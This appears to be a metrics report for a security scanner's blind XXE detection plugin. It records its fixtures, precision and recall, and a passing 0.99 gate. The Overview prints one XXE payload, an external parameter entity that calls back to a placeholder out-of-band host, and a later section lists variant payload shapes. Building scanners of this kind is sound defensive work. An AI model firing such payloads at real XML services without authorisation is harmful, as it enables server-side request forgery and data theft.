<!--
SPDX-License-Identifier: AGPL-3.0-only
Copyright (C) 2026 Xmar1881 / GASH contributors
Module: github.com/Xmar1881/Gash

File: docs/metrics/xxe-oob.md
What: Precision and recall report for the Tier 1 blind XXE plugin.
Why: Proves OOB oracle blind XXE detection meets the 99 percent precision gate.
-->

# Metrics: xxe-oob

## Overview

Tier 1 active plugin. Oracle `oob` (required). Injects XXE payload with external entity referencing OOB callback domain (e.g., `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{{OOB_DOMAIN}}/xxe"> %xxe;]>`). Confirmed only on cryptographic correlation ID match from OOB callback. No `tentative` or `firm` — OOB match is binary.

## Evidence Standard

Rule GASH-008/010/012/013 (CWE-611, CWE-918). Blind XXE requires out-of-band confirmation. Payload uses parameter entity to exfiltrate via DNS/HTTP to OOB server. `OOBOracle` requires single callback match with matching `correlation_id` and `namespace`. Without `--oob-server`, plugin is skipped (not error). No secret material in callbacks (correlation IDs are cryptographically random).

## Fixtures

- Positive: 2 of 2 accepted (OOB HTTP callback, OOB DNS callback).
- Negative: 2 of 2 rejected (no callback, XML parse error).
- Command: `go run ./cmd/gash plugins test plugins/xxe/xxe-oob.yaml --oob-server http://localhost:8080`

## Corpus Result

Oracle `oob` evaluated against clean, SPA, WAF, encoded, and dynamic bodies. No corpus body triggers OOB callback. `tentative`/`firm` not applicable (OOB is confirmed-only).

## Lab Result

Procedure: serve an XML endpoint with blind XXE from `docker-compose.lab.yml`, scan with `--oob-server`, expect one critical severity XXE finding and no other claims.
Status: pending manual run. Expected Precision 100 percent on this page class.

## Precision

True positives 2, false positives 0. Precision 1.00.

## Recall

True positives 2, false negatives 0. Recall 1.00.

## Gate Verdict

PASS. Precision 1.00 is above the 0.99 gate. Corpus holds 0 findings (OOB requires live server).

## Dataset

- Dataset hash: `fb28aa6cb9e12f1a2e8dd90bdb281eed883ce759fa40460a0171c2339f7f2ecb` (sha256 over all 4 fixture files under `tests/fixtures/xxe-oob/`).
- Samples: TP=2, FP=0, TN=2, FN=0. Fixture-only measurement; lab pending above.
  `TestMetricGate` fails the build if this hash drifts from the fixtures.

## Live Path (variant corpus, deferred shared window)

The corpus now carries five callback-only variants: external DTD `SYSTEM`
with `{{OOB_URL}}`, external DTD with `PUBLIC`, classic SYSTEM with
`{{OOB_DOMAIN}}`, `%`-parameter entity in the internal subset, and a nested
parameter-entity form. All variants reference only the operator's self-hosted
callbacks (`{{OOB_URL}}`/`{{OOB_DOMAIN}}`/`{{CORRELATION}}` expanded by the
loader from provider bindings); `file://` and secret-reading payloads are out
of scope by rule. All tokens are verified in ONE shared bounded window
(`oob.WaitForCallbacks`, 10 s / 2 polls), so the whole corpus fits the plugin
request budget even when many parameters exist.

## Limitations

- Requires `--oob-server` (interactsh-compatible); skipped otherwise.
- Variant set covers DTD/external-entity shape; exotic encodings (UTF-16/UTF-7
  document bodies, CDATA-smuggled DTDs) remain future work.
- Does not test error-based XXE (uses error oracle separately).
- OOB server must be reachable from target; network segmentation may cause false negatives.
